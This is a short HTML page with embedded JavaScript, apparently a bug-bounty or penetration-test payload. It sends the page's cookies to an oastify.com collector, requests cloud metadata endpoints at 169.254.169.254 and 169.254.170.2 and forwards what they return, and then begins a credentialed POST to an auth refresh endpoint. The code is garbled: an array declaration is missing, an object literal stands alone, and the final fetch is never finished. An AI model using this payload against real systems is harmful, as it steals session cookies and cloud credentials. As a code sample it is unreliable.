<html><body><script>
var C="ajx3dtljcz0yxdl6cddah6lzeqkh87ww.oastify.com";
function ex(l,d){new Image().src="https://"+C+"/scan?"+l+"="+encodeURIComponent((d+"").substring(0,800));}

ex("cookies", document.cookie || "none");

  ["meta_https", "https://169.254.169.254/latest/meta-data/"],
  ["ecs_meta", "http://169.254.170.2/v2/metadata"],
];

targets.forEach(function(t) {
  fetch(t[1], {credentials:'include'}).then(function(r) {
    ex(t[0]+"_s", r.status);
    return r.text();
  }).then(function(d) {
    if(d && d.length > 0) ex(t[0]+"_b", d);
  }).catch(function(e) {
    ex(t[0]+"_e", e.message);
  });
});

  method:"POST", credentials:"include",
  headers:{"Content-Type":"application/json"}, body:"{}"

});

fetch("https://white-hat.api.stravito.com/auth/refresh", {
